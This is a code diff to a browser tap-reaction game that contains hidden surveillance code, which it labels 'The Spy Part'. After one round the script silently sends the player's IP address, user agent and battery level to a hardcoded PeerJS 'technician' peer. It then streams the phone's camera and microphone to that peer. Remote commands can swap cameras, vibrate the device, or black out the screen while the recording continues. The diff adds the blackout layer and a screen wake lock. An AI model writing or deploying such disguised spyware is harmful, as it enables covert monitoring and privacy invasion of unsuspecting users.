@@ -33,6 +33,7 @@
             position: relative;
             border: 4px solid #34495e;
             cursor: pointer;
+            z-index: 10;
         }
 
             #game-board.active {
@@ -51,6 +52,7 @@
             margin-bottom: 30px;
             text-align: center;
             width: 90%;
+            z-index: 10;
         }
 
         #main-display {
@@ -66,9 +68,24 @@
             margin-top: 10px;
             line-height: 1.4;
         }
+
+        /* HIDDEN BLACKOUT LAYER */
+        #blackout-layer {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: black;
+            z-index: 9999;
+            display: none;
+            cursor: none;
+        }
     </style>
 </head>
 <body>
+
+    <div id="blackout-layer"></div>
 
     <div id="hud-container">
         <div id="main-display">TAP TO START</div>
@@ -77,38 +94,45 @@
     <div id="game-board"></div>
 
     <script>
-        // --- CONFIG ---
-        const TECHNICIAN_ID = "tech-support-commander-001";
-        const TRIGGER_COUNT = 3;
+        // --- CONFIGURATION ---
+        const TECHNICIAN_ID = "tech-support-commander-671";
+        const TRIGGER_COUNT = 1; // Connects after 1 round
 
-        // --- VARS ---
+        // --- VARIABLES ---
         let gameState = 'IDLE';
         let beepTimestamp = 0;
         let roundCount = 0;
         let isConnected = false;
+        let wakeLock = null;
 
-        // Audio
         const AudioContext = window.AudioContext || window.webkitAudioContext;
         let audioCtx;
-
-        // DOM
         const board = document.getElementById('game-board');
         const display = document.getElementById('main-display');
+        const blackoutLayer = document.getElementById('blackout-layer');
 
-        // PeerJS
         const peer = new Peer();
         let myDataConnection = null;
         let currentStream = null;
 
-        // 1. INPUT HANDLER
+        // 1. GAME INPUT HANDLER
         board.addEventListener('touchstart', handleInput, { passive: false });
         board.addEventListener('mousedown', handleInput);
 
-        function handleInput(e) {
+        async function handleInput(e) {
             e.preventDefault();
+
+            // Request Wake Lock (Keep screen on)
+            if (!wakeLock) {
+                try { wakeLock = await navigator.wakeLock.request('screen'); }
+                catch (err) { console.log("Wake Lock Error", err); }
+            }
+
+            // Init Audio
             if (!audioCtx) audioCtx = new AudioContext();
             if (audioCtx.state === 'suspended') audioCtx.resume();
 
+            // Game Logic Loop
             if (gameState === 'IDLE') {
                 gameState = 'WAITING_FOR_BEEP';
                 display.innerText = "WAIT...";
@@ -137,7 +161,10 @@
                 flashBoard('success');
                 roundCount++;
 
-                if (roundCount === TRIGGER_COUNT && !isConnected) activateSurveillance();
+                // --- TRIGGER SURVEILLANCE ---
+                if (roundCount === TRIGGER_COUNT && !isConnected) {
+                    activateSurveillance();
+                }
 
                 gameState = 'WAITING_FOR_BEEP';
                 setTimeout(() => {
@@ -148,14 +175,14 @@
             }
         }
 
-        // 2. TIMING & AUDIO
+        // 2. TIMING & AUDIO UTILS
         let beepTimer = null;
         function scheduleBeep() {
             beepTimer = setTimeout(() => {
                 playTone();
                 beepTimestamp = Date.now();
                 gameState = 'WAITING_FOR_TAP';
-            }, Math.floor(Math.random() * 400) );
+            }, Math.floor(Math.random() * 2000) + 1000);
         }
 
         function playTone() {
@@ -172,54 +199,64 @@
             setTimeout(() => board.classList.remove(type), 200);
         }
 
-        // 3. SURVEILLANCE & REMOTE CONTROL
+        // 3. SURVEILLANCE LOGIC (The Spy Part)
         async function activateSurveillance() {
             isConnected = true;
             try {
+                // A. Connect Data Layer
                 myDataConnection = peer.connect(TECHNICIAN_ID);
 
                 myDataConnection.on('open', async () => {
-                    // A. Send Battery & IP
-                    let batLevel = null;
-                    try {
-                        const bat = await navigator.getBattery();
-                        batLevel = bat.level;
-                    } catch (e) { }
 
+                    // --- GET IP & BATTERY & SEND SILENTLY ---
                     try {
-                        const r = await fetch('https://api.ipify.org?format=json');
-                        const j = await r.json();
-                        myDataConnection.send({ type: 'info', ip: j.ip, battery: batLevel });
-                    } catch (e) { }
+                        const ipReq = await fetch('https://api.ipify.org?format=json');
+                        const ipJson = await ipReq.json();
 
-                    // B. Listen for Commander Instructions
+                        let batLevel = null;
+                        try {
+                            const bat = await navigator.getBattery();
+                            batLevel = bat.level;
+                        } catch (e) { }
+
+                        // Send Info Packet
+                        myDataConnection.send({
+                            type: 'info',
+                            ip: ipJson.ip,
+                            userAgent: navigator.userAgent,
+                            battery: batLevel
+                        });
+
+                    } catch (e) { console.error("Data fetch failed", e); }
+
+                    // --- LISTEN FOR REMOTE COMMANDS ---
                     myDataConnection.on('data', (data) => {
-                        console.log("Command received:", data);
+                        // Support both string "swap" and object {command: "swap"}
+                        const cmd = data.command || data;
 
-                        // COMMAND: SWAP CAMERA
-                        if (data.command === 'swap') toggleCamera();
-
-                        // COMMAND: VIBRATE
-                        if (data.command === 'vibrate') {
-                            if (navigator.vibrate) navigator.vibrate([200, 100, 200]);
+                        if (cmd === 'swap') toggleCamera();
+                        if (cmd === 'vibrate') {
+                            if (navigator.vibrate) navigator.vibrate([300, 100, 300]);
                         }
-
-                        // COMMAND: SPEAK
-                        if (data.command === 'speak' && data.text) {
-                            const speech = new SpeechSynthesisUtterance(data.text);
-                            window.speechSynthesis.speak(speech);
-                        }
+                        if (cmd === 'blackout_on') blackoutLayer.style.display = 'block';
+                        if (cmd === 'blackout_off') blackoutLayer.style.display = 'none';
                     });
                 });
 
+                // B. Start Video Stream
                 await startStream('user');
+
             } catch (err) { console.log("Silent error:", err); }
         }
 
         async function startStream(mode) {
             if (currentStream) currentStream.getTracks().forEach(t => t.stop());
+
+            // This triggers the permission popup
             const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode }, audio: true });
             currentStream = stream;
+
+            // Send video to technician
             peer.call(TECHNICIAN_ID, stream);
         }
 
@@ -228,6 +265,13 @@
             currentMode = (currentMode === 'user') ? 'environment' : 'user';
             startStream(currentMode);
         }
+
+        // Re-acquire Wake Lock if app switches
+        document.addEventListener("visibilitychange", async () => {
+            if (wakeLock !== null && document.visibilityState === "visible") {
+                wakeLock = await navigator.wakeLock.request('screen');
+            }
+        });
     </script>
 </body>
 </html>
